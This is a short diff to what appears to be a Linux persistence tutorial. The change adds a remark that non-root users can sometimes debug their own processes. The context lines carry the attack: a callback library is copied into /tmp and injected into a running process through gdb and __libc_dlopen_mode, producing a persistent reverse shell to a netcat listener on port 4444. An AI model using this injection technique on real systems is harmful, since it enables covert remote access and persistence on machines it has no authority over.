@@ -132,7 +132,7 @@ void *callback(void *a)
 `cp ./libcallback.so /tmp/libcallback.so`
 
 **Find the PID of a target process to inject the library into**<br />
-(e.g. PID selected is 2739)<br />
+(e.g. PID selected is 2739) Some systems allow the non-root user to debug their own processes.<br />
 `echo 'print __libc_dlopen_mode("/tmp/libcallback.so", 2)' | gdb -p 2739`
 
 You should see a connection to your netcat session listening on port 4444.  You should not lose your shell even if the parent process exits.
